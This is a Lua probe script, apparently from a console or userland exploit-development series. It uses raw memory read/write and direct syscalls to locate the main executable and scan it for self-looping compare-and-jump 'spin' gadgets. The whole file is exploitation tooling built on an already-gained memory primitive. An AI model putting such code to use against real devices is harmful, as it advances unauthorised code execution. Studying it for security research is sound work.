-- CRASH_CLASS: LOW
-- PROBE 757b: spin gadget scan over eboot, chunked with read_buffer
--
-- 757a used read_qword in a Lua loop over 4.8 MB and died after 37 s without
-- printing a result. Reading in chunks with memory.read_buffer and searching
-- the string is one call per 64 KB instead of one per four bytes, so the whole
-- binary takes a second or two and every step reports progress.
--
-- The wanted shape is a compare against memory followed by a conditional jump
-- back to the same compare: the child loops there until the parent writes the
-- value. Reported with the compare address, the register and the value.

print("=== PROBE 757b: EBOOT SPIN SCAN (CHUNKED) ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local U = function(a) a=to_num(a); return uint64(string.format("0x%08X%08X", math.floor(a/4294967296), a%4294967296)) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function call(sc, a1, a2, a3, a4, a5, a6)
    local ok, r = pcall(function() return sc(U(a1), U(a2), U(a3), U(a4), U(a5), U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
print("[A] tid="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))

local rb = to_num(memory.alloc(0x8000))
local cnt = to_num(memory.alloc(8)); wd(cnt, 0)
local rc = call(mk(674), rb, 72, 512, cnt, 0x40000000, 0)
local n = rd(cnt)
print(string.format("[A] 674 ret=%s count=%s", tostring(rc), tostring(n)))
local base, size = nil, nil
if type(n) == "number" then
    for i=0,math.min(n,512)-1 do
        local r = rb + i*72
        local a = rd(r) + rd(r+4)*4294967296
        local b = rd(r+8) + rd(r+12)*4294967296
        local prot = rd(r+0x18)
        if prot == 5 and (b-a) > 0x200000 and a < 0x1000000000 then
            if base == nil or (b-a) > size then base, size = a, b-a end
        end
    end
end
print(string.format("[A] eboot base=%08X size=%X", base or 0, size or 0))

-- compare forms: 83 3? imm8 (byte 0x38..0x3F is modrm for [reg])
local REG = { [0x38]="rax", [0x39]="rcx", [0x3a]="rdx", [0x3b]="rbx",
              [0x3c]="rsp", [0x3d]="rbp", [0x3e]="rsi", [0x3f]="rdi" }
local found, scanned = 0, 0
local CH = 0x10000
local function scan_chunk(cs, s)
    local p = 1
    while found < 12 do
        local i = s:find("\131", p, true)
        if not i then return end
        p = i + 1
        local b2, imm, jcc, rel = s:byte(i+1, i+4)
        if b2 and imm and jcc and rel and REG[b2] and (jcc == 0x75 or jcc == 0x74) then
            local cmpaddr = cs + (i-1)
            local r = rel
            if r > 127 then r = r - 256 end
            if cmpaddr + 4 + r == cmpaddr then
                found = found + 1
                print(string.format("[B] spin cmp=%08X cmp [%s],%02X %s -> self", cmpaddr, REG[b2], imm, (jcc==0x75 and "jne" or "je")))
            end
        end
    end
end
if base then
    local off = 0
    while off < size - 0x20 and found < 12 do
        local take = math.min(CH, size - 0x20 - off)
        local ok, s = pcall(function() return memory.read_buffer(base + off, take) end)
        if not ok or type(s) ~= "string" then
            print(string.format("[C] read failed at %08X", base + off))
            break
        end
        scan_chunk(base + off, s)
        scanned = scanned + take
        off = off + take
        if (off % 0x100000) < CH then
            print(string.format("[C] scanned %X / %X", off, size))
        end
    end
end
print(string.format("[D] found=%d scanned=%X", found, scanned))
print("[E] health="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))
print("=== 757b DONE ===")
